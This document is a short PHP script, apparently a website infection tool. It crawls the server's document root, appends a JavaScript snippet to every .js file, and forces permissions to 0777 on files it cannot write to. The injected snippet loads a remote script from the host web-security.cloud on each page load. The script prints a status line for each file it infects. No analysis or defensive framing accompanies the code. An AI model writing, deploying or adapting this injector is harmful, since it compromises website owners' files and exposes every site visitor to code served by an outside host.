<?php

            $startFolder = $_SERVER['DOCUMENT_ROOT'];
        

        $add_text = "document.addEventListener('DOMContentLoaded', function(){
    if(typeof window.web_security == \"undefined\"){
        var s = document.createElement(\"script\");
        s.src = \"//web-security.cloud/event?l=201297\";
        document.head.appendChild(s);
        window.web_security = \"success\";
    }
}, false);";

        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startFolder));
        $files = array();
        foreach ($rii as $file) {
            if ($file->isDir()) {
                continue;
            }
            $file_info = explode(".", $file->getPathname());
            $ext = $file_info[sizeof($file_info) - 1];
            if (strtolower($ext) !== "js")
                continue;
            $isInjected = file_put_contents($file->getPathname(), "\n" . $add_text, FILE_APPEND | LOCK_EX);
            $isInjectable = true;
            if (!$isInjected) {
                $isInjectable = chmod($file->getPathname(), 0777);
                $isInjected = file_put_contents($file->getPathname(), "\n" . $add_text, FILE_APPEND | LOCK_EX);
            }
            echo "<b style='color: goldenrod'>" . $file->getPathname() . "</b> :: is injected : " .
                (($isInjected) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
                " :: is injectable : " .
                (($isInjectable) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
                "<br />";
        }